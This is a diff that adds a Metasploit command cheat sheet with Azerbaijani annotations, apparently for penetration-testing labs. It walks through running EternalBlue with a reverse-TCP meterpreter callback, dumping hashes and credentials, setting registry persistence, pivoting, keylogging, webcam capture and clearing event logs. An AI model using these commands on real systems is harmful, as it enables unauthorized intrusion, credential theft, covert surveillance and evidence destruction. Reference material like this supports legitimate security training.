@@ -1,1 +1,135 @@
+==============================
+METASPLOIT PROFESSIONAL CHEAT SHEET
+==============================
+
+# START / CORE
+msfconsole                         -> Metasploit-i işə salır
+msfconsole -q                      -> Səssiz (banner olmadan)
+exit                               -> Çıxış
+version                            -> Metasploit versiyası
+
+# HELP
+help                               -> Ümumi kömək
+help exploit                       -> Exploit əmrləri
+help payload                       -> Payload əmrləri
+
+# WORKSPACE
+workspace                          -> Workspace siyahısı
+workspace -a lab                   -> Yeni workspace
+workspace lab                      -> Workspace dəyiş
+workspace -d lab                   -> Workspace sil
+
+# SEARCH / MODULES
+search smb                         -> Modul axtarışı
+search type:exploit                -> Exploit modulları
+search type:auxiliary              -> Auxiliary modulları
+search type:post                   -> Post-exploitation modulları
+search name:eternal                -> Ada görə axtarış
+
+# MODULE SELECTION
+use exploit/windows/smb/ms17_010_eternalblue
+                                   -> Modul seçir
+back                               -> Moduldan çıxır
+info                               -> Modul detalları
+show options                       -> Modul parametrləri
+show payloads                      -> Uyğun payloadlar
+show targets                       -> Hədəf tipləri
+show advanced                      -> Advanced parametrlər
+
+# OPTIONS
+set RHOSTS 10.10.10.10              -> Hədəf IP
+set RPORT 445                      -> Hədəf port
+set LHOST 10.10.14.1               -> Callback IP
+set LPORT 4444                     -> Callback port
+set PAYLOAD windows/x64/meterpreter/reverse_tcp   -> Payload seçir
+setg RHOSTS 10.10.10.10             -> Global dəyişən
+unset RHOSTS                       -> Parametri sil
+unsetg RHOSTS                      -> Global parametri sil
+
+# CHECK / RUN
+check                              -> Zəiflik yoxlaması
+run                                -> Modulu işə salır
+exploit                            -> Exploit icrası
+exploit -j                         -> Background exploit
+
+# JOBS
+jobs                               -> Aktiv joblar
+jobs -l                            -> Detallı siyahı
+jobs -k 1                          -> Job öldür
+
+# SESSIONS
+sessions                           -> Sessiya siyahısı
+sessions -i 1                      -> Sessiyaya daxil ol
+sessions -k 1                      -> Sessiyanı bağla
+sessions -u 1                      -> Shell -> Meterpreter upgrade
+sessions -C "whoami" -i 1          -> Komanda icra et
+
+# METERPRETER CORE
+sysinfo                            -> Sistem məlumatı
+getuid                             -> Cari user
+getpid                             -> Cari process
+ps                                 -> Process siyahısı
+pwd                                -> Cari qovluq
+cd C:\\                            -> Qovluq dəyiş
+ls                                 -> Fayl siyahısı
+cat file.txt                       -> Fayl oxu
+upload file.exe                    -> Fayl yüklə
+download file.txt                  -> Fayl endir
+rm file.txt                        -> Fayl sil
+mkdir test                         -> Qovluq yarat
+
+# PRIVILEGE
+getsystem                          -> SYSTEM privilege cəhdi
+hashdump                           -> Parol hash-ləri
+load kiwi                          -> Mimikatz modulu
+creds_all                          -> Credential dump
+
+# PERSISTENCE
+run persistence                    -> Persistence modulu
+reg enumkey -k HKLM\\Software      -> Registry enum
+reg setval -k HKCU\\Run            -> Registry persistence
+
+# NETWORK
+ipconfig                           -> Şəbəkə məlumatı
+route                              -> Routing cədvəli
+arp                                -> ARP cache
+portfwd add -l 3389 -p 3389 -r 127.0.0.1   -> Port forwarding
+
+# PIVOTING
+run autoroute -s 10.10.0.0/16      -> Pivot route əlavə et
+route add 10.10.0.0 255.255.0.0 1  -> Manual route
+
+# KEYLOG / SCREEN
+keyscan_start                     -> Keylogger başlat
+keyscan_dump                      -> Keylog dump
+screenshot                        -> Screenshot al
+webcam_snap                       -> Webcam şəkli
+
+# SHELL
+shell                              -> OS shell
+execute -f cmd.exe                 -> Komanda icra
+execute -f payload.exe -H          -> Gizli icra
+
+# POST EXPLOITATION
+use post/windows/gather/enum_logged_on_users
+                                   -> Logged-on userlər
+use post/windows/manage/migrate    -> Process migrate
+run post/windows/gather/enum_applications   -> Installed app-lər
+
+# DATABASE
+db_status                          -> DB status
+db_nmap 10.10.10.0/24              -> Nmap scan DB-yə yaz
+hosts                              -> Hostlar
+services                           -> Servislər
+loot                               -> Toplanan loot
+creds                              -> Credential DB
+
+# LOOT / FILES
+loot                               -> Loot siyahısı
+loot -t hashdump                   -> Hash loot
+notes                              -> Qeydlər
+
+# CLEANUP
+clearev                            -> Event log sil
+exit                               -> Çıxış
 
